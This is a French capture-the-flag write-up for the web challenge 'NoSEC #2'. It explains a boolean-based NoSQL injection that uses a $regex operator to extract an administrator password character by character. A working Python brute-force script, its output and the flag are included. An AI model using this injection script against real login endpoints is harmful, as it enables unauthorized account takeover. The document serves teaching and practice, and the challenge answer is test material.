# NoSEC #2

### Catégorie

Web

### Description

Vous devez retrouver le mot de passe de l'administrateur pour valider le challenge !
L'URL du challenge reste la même.

http://139.162.137.94:3000/login

Format: Hero{motdepasse}

### Auteur

xanhacks

### Solution

Ici, nous pouvons utiliser une regex pour deviner le mot de passe et faire une NoSQL injection boolean based.

C'est à dire, la requête NoSQL renvoie :
- true : le mot de passe match la regex (L'application web nous indique que la connexion a eu lieu avec succès)
- false : le mot de passe NE match PAS la regex (L'application web nous indique que le mot de passe n'est pas correct)

Exemple:
```
-> password: abc123

regex: a.*  (valid)	   {"username":"admin","password":{"$regex":"^a.*$"}}
regex: aa.* (not valid)
regex: ab.* (valid)
regex: aba.* (not valid)
regex: abb.* (not valid)
regex: abc.* (valid)
etc ...
```

Nous pouvons donc récupérer caractère par caractère le mot de passe de l'administrateur avec un script python.

```python
#!/usr/bin/env python3
import json
import string
import requests

flag = ""
url = "http://139.162.137.94:3000/login"

print("password: ", end="")

for _ in range(32):
    for c in string.printable:
        data = {
                "username": "admin",
                "password": {"$regex": f"^{flag}{c}.*$"}
        }

        req = requests.post(url, json.dumps(data), headers={"Content-Type": "application/json"})
        
        if "You can validate" in req.text:
            flag += c
            print(c, end="", flush=True)
            break
```

```shell
> python3 solve.py
password: 5d41402abc4b2a76b9719d911017c592
```

### Flag

Hero{5d41402abc4b2a76b9719d911017c592}